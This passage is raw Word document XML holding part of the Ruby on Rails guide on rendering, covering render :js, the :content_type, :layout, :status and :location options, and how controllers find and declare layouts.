    <w:p w14:paraId="1A72D27F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails can render vanilla JavaScript:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4368"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="661C217C" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42021CEA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1103956904"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :js</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "alert('Hello Rails');"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="603D8223" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will send the supplied string to the browser with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MIME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> type of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>text/javascript</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B66EBA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.11 Options for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC2B2A2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Calls to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method generally accept four options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174BBB42" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:content_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5B949D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07612960" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357CEF4A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:location</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F4B231" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.11.1 The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:content_type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Option</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A64C025" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, Rails will serve the results of a rendering operation with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MIME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> content-type of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>text/html</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application/json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application/xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.). There are times when you might like to change this, and you can do so by setting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:content_type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7055"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="719746C3" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="562C03B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="753670588"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :file</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; filename, :content_type</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'application/rss'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5382AB63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.11.2 The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Option</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F5DB3E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With most of the options to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t>, the rendered content is displayed as part of the current layout. You’ll learn more about layouts and how to use them later in this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E8B10A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to tell Rails to use a specific file as the layout for the current action:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4008"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="51D13748" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69DCAC77" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="701201334"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :layout</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'special_layout'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6242AE21" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also tell Rails to render with no layout at all:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2688"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4A563401" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="331F1430" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1209994793"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :layout</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6815D78A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.11.3 The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Option</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FAA66C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails will automatically generate a response with the correct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> status code (in most cases, this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>200 OK</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to change this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3288"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="09565BCB" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32CF362E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :status</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 500</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="525E5E59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :status</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :forbidden</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="510C3DF5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails understands both numeric and symbolic status codes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB1B738" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.11.4 The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:location</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Option</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CEC9AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:location</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Location</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5975"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5D6FA5B8" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="691B754B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1510295868"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :xml</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; photo, :location</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; photo_url(photo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F357E21" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.12 Finding Layouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62347C3F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To find the current layout, Rails first looks for a file in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the same base name as the controller. For example, rendering actions from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/photos.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/photos.builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). If there is no such controller-specific layout, Rails will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/application.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/application.builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If there is no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout, Rails will use a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout if one exists. Rails also provides several ways to more precisely assign specific layouts to individual controllers and actions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128F68F0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.12.1 Specifying Layouts for Controllers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B96FD1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can override the default layout conventions in your controllers by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>layout</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5688"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0D9E05F2" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F037A58" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03795E82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout "inventory"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622B6137" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  #...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="353D5977" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0256D4FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this declaration, all of the views rendered by the products controller will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/inventory.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as their layout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58356046" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
